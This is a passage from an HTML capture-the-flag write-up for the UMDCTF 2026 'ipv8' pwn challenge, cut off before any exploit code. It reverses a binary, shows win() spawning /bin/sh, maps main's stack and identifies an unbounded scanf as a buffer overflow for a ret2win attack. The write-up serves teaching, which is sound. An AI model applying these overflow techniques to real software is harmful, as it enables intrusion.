@@ -1,0 +1,816 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>UMDCTF 2026</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="34fa95c0-641b-808e-ba4a-cc12dfcec46f" class="page sans"><header><h1 class="page-title" dir="auto">UMDCTF 2026</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="34fa95c0-641b-80f4-a87f-c92aae74a281" class="">Pwn/ ipv8</h1></div><div style="display:contents" dir="auto"><blockquote id="34fa95c0-641b-80d9-8ae3-fc7f535ffaa9" class="">whats better than ipv9? ipv8 (backwards compatible) ofc!<br/><code>nc challs.umdctf.io 30308</code></blockquote></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-8029-9836-fe59099ab286" class="">tl;dr</h2></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-806e-bb52-e16bcf8ecf80" class="">ret2win with a twist - you need a buffer overflow on the source address field to smash the return address, but there’s a roadblock: a hardcoded <code>&quot;0.0.0.0&quot;</code> string that triggers <code>exit()</code> before you ever reach <code>ret</code>. You use a second, bounded input to  place a null byte on top of that string so execution falls through, stack alignment issue on top of that.</p></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-805a-9570-e7275c84b8e5" class="">First look</h2></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-806b-ba02-efb2a4384c44" class="">We get a single binary, <code>ipv4</code>.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="34fa95c0-641b-80b9-b7be-f974f9d62bad" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">$ file ipv4
+ipv4: ELF 64-bit LSB executable, x86-64, statically linked, not stripped
+
+$ checksec ipv4
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80b2-bbcd-cbfeae5b5852" class="">Statically linked, not stripped, no PIE. checksec claims there’s a canary, but that just means the binary was compiled with <code>-fstack-protector</code> - it doesn’t guarantee every function uses one. We’ll check <code>main</code> specifically in a sec.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-801e-bd41-eed9b100ef62" class="">I connected to the service to see what it actually does:</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-8074-9e60-e2b90a496c7c" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">$ nc challs.umdctf.io 30308
+IPv8 is the future! As someone with an ipv4 address, luckily ipv8 is backwards compatible!
+What is your Source ASN Prefix?
+&gt; 1234
+Sorry, you don&#x27;t get to set that silly! This is for ipv8 only!
+What is your Source Host Address?
+&gt; 1.2.3.4
+What is your Destination ASN Prefix?
+&gt; 5678
+Sorry, you don&#x27;t get to set that silly! This is for ipv8 only!
+What is your Destination Host Address?
+&gt; 5.6.7.8
+Wrong RINE address!! Perhaps you were looking for 100.72.7.67</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-800e-8d6d-cebcb3081483" class="">So it’s pretending to build some kind of IPv8 packet header. It asks for four things - source prefix, source host, dest prefix, dest host. The ASN prefix inputs get ignored. The host address inputs seem to get validated. At the end it complains about a “RINE address.” Alright, time to throw it in <a href="https://binary.ninja/">Binary Ninja</a>, I used the free version of Binary Ninja for this challenge.</p></div><div style="display:contents" dir="auto"><h2 id="34fa95c0-641b-808d-b7cc-c616107f662b" class="">Reversing</h2></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80e7-bb6d-ea2a7bdf3e03" class="">The binary isn’t stripped, so the symbol table is our friend. Running <code>nm</code> and filtering out the standard library noise, three functions stand out right next to <code>main</code>:</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-8052-81ff-e60c6609017b" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">0x402f45  win
+0x402f5b  check_valid_address
+0x402f97  check_rine
+0x403018  main</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8081-b775-f5f3df2bc91a" class="">A function literally named <code>win</code>.</p></div><div style="display:contents" dir="auto"><h3 id="34fa95c0-641b-80da-be31-e0d4f0b4f968" class="">win</h3></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-800c-aab8-c80ba383608f" class="">Tiny function. Opens a shell:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="34fa95c0-641b-807f-9e98-dfdc76ddf820" class="code code-wrap"><code class="language-c" style="white-space:pre-wrap;word-break:break-all">uint64_t win()
+return __libc_system(&quot;/bin/sh&quot;)</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-800a-a7da-e992327a8437" class="">That’s our target. we need to redirect the execution here.</p></div><div style="display:contents" dir="auto"><h3 id="34fa95c0-641b-8082-96c3-f09c4f63bba8" class="">check_valid_address</h3></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80f4-ac2c-f7d9b18e30cb" class="">This one takes a string and walks through it character by character, counting dots. If there are exactly 3 dots, it returns 0 (valid). Otherwise non-zero (invalid). so basically checking if it looks like an IPv4 address, it doesn’t validate the octets or anything, just counts periods.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80bf-acc5-dc90913eb385" class="">Both host address inputs go through this check. Our payloads will need to contain exactly 3 <code>.</code> characters to not get rejected.</p></div><div style="display:contents" dir="auto"><h3 id="34fa95c0-641b-807a-b36a-d4d863806d5f" class="">check_rine</h3></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-80fd-852d-d899c432df90" class="">This is the gatekeeper. Pseudocode:</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-8061-a74d-dd33e7e898f5" class="code code-wrap"><code class="language-c" style="white-space:pre-wrap;word-break:break-all">void check_rine(char *addr) {
+    if (strcmp(addr, &quot;0.0.0.0&quot;) == 0) {
+        puts(&quot;Sorry, we want devices using ipv8 only...&quot;);
+        exit(1);    // hard exit, no coming back
+    }
+    if (strcmp(addr, &quot;100.72.7.67&quot;) == 0) {
+        puts(&quot;Welcome in our beloved ipv8 address&quot;);
+        win();      // shell!
+    } else {
+        puts(&quot;Wrong RINE address!! Perhaps you were looking for 100.72.7.67&quot;);
+        // just returns, doesn&#x27;t exit
+    }
+}</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8059-bc8b-c9337ea98712" class="">Three paths:</p></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80df-8a99-fe621320ed19" class="numbered-list" start="1"><li>Input is <code>&quot;0.0.0.0&quot;</code> - process dies. Bad.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80f0-a7a9-f2147d77e189" class="numbered-list" start="2"><li>Input <code>&quot;100.72.7.67&quot;</code> calls <code>win()</code>.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80c8-b3a7-dcdbdfb736ef" class="numbered-list" start="3"><li>Anything else prints an error and returns normally. Interesting.</li></ol></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8003-9d30-e017cd30c68f" class="">That third path is key. If <code>check_rine</code> gets a string that isn’t <code>&quot;0.0.0.0&quot;</code>, it doesn’t kill the process. It just returns, and <code>main</code> continues to its <code>ret</code> instruction.</p></div><div style="display:contents" dir="auto"><h3 id="34fa95c0-641b-8048-ab13-d3c8045a0f12" class="">main</h3></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8052-9aa6-dc6cf0269830" class="">Here’s where I spent most of my time. The prologue:</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-8082-833c-db90af645af2" class="code code-wrap"><code class="language-nasm" style="white-space:pre-wrap;word-break:break-all">push   rbp
+mov    rbp, rsp
+sub    rsp, 0xc0</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8044-be93-e564372ed279" class="">No <code>mov rax, fs:0x28</code> so no canary in this function. checksec lied to us (well, it didn’t, the binary <em>has</em> canary support, <code>main</code> just doesn’t use it). That means we can overflow without tripping a canary check.</p></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-8081-b813-fe5415326865" class="">I mapped out the stack by tracing the <code>lea</code> instructions before each <code>scanf</code> call and the <code>movabs</code> that initializes the hardcoded strings. The layout from low to high:</p></div><div style="display:contents" dir="auto"><pre id="34fa95c0-641b-8092-9e89-e34ad381bb6e" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">[rbp - 0xc0]  Destination host buffer     scanf(&quot;%48s&quot;, ...) - max 48 chars
+              (48 bytes)
+[rbp - 0x90]  &quot;0.0.0.0&quot;                   initialized by main, passed to check_rine
+              (8 bytes)
+              (40 bytes of unused space)
+[rbp - 0x60]  Source host buffer           scanf(&quot;%s&quot;, ...) - UNBOUNDED
+              (48 bytes)
+[rbp - 0x30]  &quot;0.0.0.0&quot;                   another copy, never actually used
+              (48 bytes of space up to rbp)
+[rbp + 0x00]  Saved RBP
+[rbp + 0x08]  Return address</code></pre></div><div style="display:contents" dir="auto"><p id="34fa95c0-641b-807f-bfe6-c8832290fbf8" class="">The execution flow:</p></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80c0-9a34-c41f00370531" class="numbered-list" start="1"><li><code>scanf(&quot;%*s&quot;)</code> reads the source ASN prefix and throws it away (<code>%*s</code> means read but don’t store)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80d8-9596-d0300df0c4bb" class="numbered-list" start="2"><li><code>scanf(&quot;%s&quot;, rbp-0x60)</code> reads source host address. No size limit. This is the bug.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-80b2-8b17-f639dd422de4" class="numbered-list" start="3"><li><code>check_valid_address(rbp-0x60)</code> needs 3 dots or we get kicked out</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-8099-9169-e97527c8c88e" class="numbered-list" start="4"><li><code>scanf(&quot;%*s&quot;)</code> reads dest ASN prefix, also thrown away</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="34fa95c0-641b-8004-9c74-f554e7095a75" class="numbered-list" start="5"><li><code>scanf(&quot;%48s&quot;, rbp-0xc0)</code> reads dest host address. Capped at 48 characters.</li></ol></div><div style="display:contents" dir="auto"><ol 